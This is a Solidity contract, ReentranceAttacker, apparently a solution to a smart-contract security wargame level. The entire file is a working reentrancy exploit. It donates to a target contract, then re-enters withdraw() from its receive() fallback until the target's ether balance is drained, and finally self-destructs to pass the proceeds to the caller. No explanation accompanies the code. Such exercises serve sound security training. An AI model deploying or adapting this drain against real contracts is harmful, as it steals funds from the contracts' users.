// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract ReentranceAttacker {
    address victim;
    Reentrance reentrance;

    event VictimBalance(uint256 indexed balance);

    constructor(address _victim) {
        victim = _victim;
    }

    function attack() external payable {
        reentrance = Reentrance(payable(victim));
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);

        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 victimBalance = address(victim).balance;
        if (victimBalance > 0) {
            uint256 amount = reentrance.balanceOf(address(this)) < victimBalance
                ? reentrance.balanceOf(address(this))
                : victimBalance;
            Reentrance(payable(victim)).withdraw(amount);
        }
    }
}
